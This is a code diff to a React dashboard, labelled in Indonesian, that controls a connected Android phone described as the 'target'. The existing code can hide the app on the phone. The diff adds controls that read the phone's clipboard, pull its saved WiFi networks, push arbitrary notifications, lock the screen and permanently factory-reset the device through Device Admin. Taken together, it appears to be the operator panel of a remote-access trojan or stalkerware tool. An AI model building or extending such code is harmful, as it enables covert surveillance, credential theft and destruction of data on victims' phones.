@@ -5,7 +5,8 @@ import StatCard from '@/components/StatCard'
 import {
   Battery, BatteryCharging, Cpu, HardDrive, Wifi,
   Clock, RefreshCw, Smartphone, EyeOff, Eye, Bell, BellOff,
-  CreditCard, Signal
+  CreditCard, Signal, Lock, Trash2, Vibrate, Send, Clipboard,
+  WifiOff, Download
 } from 'lucide-react'
 import { Server } from 'lucide-react'
 
@@ -69,7 +70,14 @@ export default function Dashboard() {
   const [loading, setLoading] = useState(true)
   const [isHidden, setIsHidden] = useState(false)
   const [isRinging, setIsRinging] = useState(false)
-  const [ctrlBusy, setCtrlBusy] = useState(false)
+  const [ctrlBusy, setCtrlBusy]         = useState(false)
+  const [vibrateCount, setVibrateCount] = useState(3)
+  const [notifTitle, setNotifTitle]     = useState('')
+  const [notifText, setNotifText]       = useState('')
+  const [showNotifModal, setShowNotifModal] = useState(false)
+  const [showWipeConfirm, setShowWipeConfirm] = useState(false)
+  const [lastClipboard, setLastClipboard]     = useState<string | null>(null)
+  const [lastWifi, setLastWifi]               = useState<string | null>(null)
 
   const fetchDevices = useCallback(async () => {
     try {
@@ -119,6 +127,18 @@ export default function Dashboard() {
     }
   }
 
+  const sendControlWithExtra = async (command: string, extra: string) => {
+    if (!selectedId || ctrlBusy) return
+    setCtrlBusy(true)
+    try {
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command, extra }),
+      })
+    } finally { setCtrlBusy(false) }
+  }
+
   const handleHideToggle = async () => {
     const cmd = isHidden ? 'unhide_app' : 'hide_app'
     await sendControl(cmd)
@@ -129,6 +149,40 @@ export default function Dashboard() {
     const cmd = isRinging ? 'stop_ring' : 'ring_device'
     await sendControl(cmd)
     setIsRinging(r => !r)
+  }
+
+  const handleSendNotification = async () => {
+    if (!notifTitle.trim()) return
+    await sendControlWithExtra('send_notification', JSON.stringify({ title: notifTitle, text: notifText }))
+    setShowNotifModal(false)
+    setNotifTitle('')
+    setNotifText('')
+  }
+
+  const handleGetClipboard = async () => {
+    if (!selectedId) return
+    setCtrlBusy(true)
+    try {
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: 'get_clipboard' }),
+      })
+      setLastClipboard('Dikirim — lihat hasil di Terminal')
+    } finally { setCtrlBusy(false) }
+  }
+
+  const handleGetWifiSaved = async () => {
+    if (!selectedId) return
+    setCtrlBusy(true)
+    try {
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: 'get_wifi_saved' }),
+      })
+      setLastWifi('Dikirim — lihat hasil di Terminal')
+    } finally { setCtrlBusy(false) }
   }
 
   const connected = device ? device.connected : false
@@ -413,6 +467,175 @@ export default function Dashboard() {
               </div>
             )}
           </div>
+
+          {/* ── KONTROL JARAK JAUH ────────────────────────────────────────── */}
+          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
+            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
+              <Lock size={13} /> Kontrol Jarak Jauh
+            </h3>
+            {!connected ? (
+              <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan kontrol ini</p>
+            ) : (
+              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
+
+                {/* Lock Screen */}
+                <button
+                  onClick={() => sendControl('lock_screen')}
+                  disabled={ctrlBusy}
+                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-blue-500/50 hover:bg-blue-500/5 transition-colors disabled:opacity-50 group"
+                >
+                  <div className="p-2 rounded-lg bg-blue-500/10 group-hover:bg-blue-500/20 transition-colors">
+                    <Lock size={18} className="text-blue-400" />
+                  </div>
+                  <span className="text-xs font-medium text-android-text">Kunci Layar</span>
+                </button>
+
+                {/* Vibrate */}
+                <div className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl">
+                  <div className="p-2 rounded-lg bg-purple-500/10">
+                    <Vibrate size={18} className="text-purple-400" />
+                  </div>
+                  <span className="text-xs font-medium text-android-text mb-1">Getar</span>
+                  <div className="flex items-center gap-1.5 w-full">
+                    <button onClick={() => setVibrateCount(v => Math.max(1, v - 1))} className="w-6 h-6 rounded bg-android-surface text-android-muted hover:text-white text-sm flex items-center justify-center">−</button>
+                    <span className="flex-1 text-center text-xs font-mono text-android-text">{vibrateCount}×</span>
+                    <button onClick={() => setVibrateCount(v => Math.min(10, v + 1))} className="w-6 h-6 rounded bg-android-surface text-android-muted hover:text-white text-sm flex items-center justify-center">+</button>
+                  </div>
+                  <button
+                    onClick={() => sendControl(`vibrate:${vibrateCount}`)}
+                    disabled={ctrlBusy}
+                    className="w-full py-1.5 rounded-lg text-xs font-semibold bg-purple-500/10 border border-purple-500/30 text-purple-400 hover:bg-purple-500/20 transition-colors disabled:opacity-50"
+                  >
+                    {ctrlBusy ? '…' : '📳 Getar'}
+                  </button>
+                </div>
+
+                {/* Send Notification */}
+                <button
+                  onClick={() => setShowNotifModal(true)}
+                  disabled={ctrlBusy}
+                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-android-green/50 hover:bg-android-green/5 transition-colors disabled:opacity-50 group"
+                >
+                  <div className="p-2 rounded-lg bg-android-green/10 group-hover:bg-android-green/20 transition-colors">
+                    <Send size={18} className="text-android-green" />
+                  </div>
+                  <span className="text-xs font-medium text-android-text">Kirim Notif</span>
+                  <span className="text-xs text-android-muted text-center">Kirim pesan ke HP</span>
+                </button>
+
+                {/* Clipboard */}
+                <button
+                  onClick={handleGetClipboard}
+                  disabled={ctrlBusy}
+                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-android-yellow/50 hover:bg-android-yellow/5 transition-colors disabled:opacity-50 group"
+                >
+                  <div className="p-2 rounded-lg bg-android-yellow/10 group-hover:bg-android-yellow/20 transition-colors">
+                    <Clipboard size={18} className="text-android-yellow" />
+                  </div>
+                  <span className="text-xs font-medium text-android-text">Clipboard</span>
+                  <span className="text-xs text-android-muted text-center">
+                    {lastClipboard ?? 'Baca clipboard HP'}
+                  </span>
+                </button>
+
+                {/* WiFi Saved */}
+                <button
+                  onClick={handleGetWifiSaved}
+                  disabled={ctrlBusy}
+                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-sky-500/50 hover:bg-sky-500/5 transition-colors disabled:opacity-50 group"
+                >
+                  <div className="p-2 rounded-lg bg-sky-500/10 group-hover:bg-sky-500/20 transition-colors">
+                    <WifiOff size={18} className="text-sky-400" />
+                  </div>
+                  <span className="text-xs font-medium text-android-text">WiFi Tersimpan</span>
+                  <span className="text-xs text-android-muted text-center">
+                    {lastWifi ?? 'Lihat daftar WiFi'}
+                  </span>
+                </button>
+
+                {/* Wipe Device */}
+                <button
+                  onClick={() => setShowWipeConfirm(true)}
+                  disabled={ctrlBusy}
+                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-red/30 rounded-xl hover:bg-android-red/10 transition-colors disabled:opacity-50 group"
+                >
+                  <div className="p-2 rounded-lg bg-android-red/10 group-hover:bg-android-red/20 transition-colors">
+                    <Trash2 size={18} className="text-android-red" />
+                  </div>
+                  <span className="text-xs font-medium text-android-red">Wipe Device</span>
+                  <span className="text-xs text-android-muted text-center">Factory reset</span>
+                </button>
+
+              </div>
+            )}
+          </div>
+
+          {/* ── SEND NOTIFICATION MODAL ───────────────────────────────────────── */}
+          {showNotifModal && (
+            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4">
+              <div className="w-full max-w-sm bg-android-surface border border-android-border rounded-2xl p-5 space-y-4">
+                <h3 className="text-sm font-bold text-white flex items-center gap-2"><Send size={15} className="text-android-green" /> Kirim Notifikasi ke HP</h3>
+                <div className="space-y-2.5">
+                  <div>
+                    <label className="text-xs text-android-muted mb-1 block">Judul</label>
+                    <input
+                      type="text"
+                      placeholder="Judul notifikasi…"
+                      value={notifTitle}
+                      onChange={e => setNotifTitle(e.target.value)}
+                      className="w-full px-3 py-2 bg-android-bg border border-android-border rounded-lg text-sm text-android-text placeholder:text-android-muted focus:outline-none focus:border-android-green"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-xs text-android-muted mb-1 block">Pesan</label>
+                    <textarea
+                      placeholder="Isi pesan…"
+                      value={notifText}
+                      onChange={e => setNotifText(e.target.value)}
+                      rows={3}
+                      className="w-full px-3 py-2 bg-android-bg border border-android-border rounded-lg text-sm text-android-text placeholder:text-android-muted focus:outline-none focus:border-android-green resize-none"
+                    />
+                  </div>
+                </div>
+                <div className="flex gap-2">
+                  <button onClick={() => setShowNotifModal(false)} className="flex-1 py-2 rounded-lg text-xs font-medium border border-android-border text-android-muted hover:text-white transition-colors">Batal</button>
+                  <button onClick={handleSendNotification} disabled={!notifTitle.trim() || ctrlBusy} className="flex-1 py-2 rounded-lg text-xs font-semibold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 transition-colors disabled:opacity-50">
+                    {ctrlBusy ? '…' : '📢 Kirim'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* ── WIPE CONFIRM MODAL ────────────────────────────────────────────── */}
+          {showWipeConfirm && (
+            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4">
+              <div className="w-full max-w-sm bg-android-surface border border-android-red/40 rounded-2xl p-5 space-y-4">
+                <div className="flex items-center gap-3">
+                  <div className="p-2.5 rounded-xl bg-android-red/10">
+                    <Trash2 size={22} className="text-android-red" />
+                  </div>
+                  <div>
+                    <h3 className="text-sm font-bold text-android-red">Wipe Device?</h3>
+                    <p className="text-xs text-android-muted mt-0.5">Tindakan ini tidak bisa dibatalkan!</p>
+                  </div>
+                </div>
+                <p className="text-xs text-android-muted bg-android-bg border border-android-red/20 rounded-lg p-3">
+                  ⚠️ Semua data, aplikasi, dan file di HP target akan <strong className="text-android-red">DIHAPUS PERMANEN</strong>. HP akan kembali ke setelan pabrik. Pastikan Device Admin sudah aktif.
+                </p>
+                <div className="flex gap-2">
+                  <button onClick={() => setShowWipeConfirm(false)} className="flex-1 py-2.5 rounded-lg text-xs font-semibold border border-android-border text-android-muted hover:text-white transition-colors">Batal</button>
+                  <button
+                    onClick={() => { sendControl('wipe_device'); setShowWipeConfirm(false) }}
+                    disabled={ctrlBusy}
+                    className="flex-1 py-2.5 rounded-lg text-xs font-semibold bg-android-red/10 border border-android-red/50 text-android-red hover:bg-android-red/20 transition-colors disabled:opacity-50"
+                  >
+                    {ctrlBusy ? '…' : '💀 Ya, Wipe!'}
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
 
           {/* Quick actions */}
           <div className="bg-android-surface border border-android-border rounded-xl p-4">
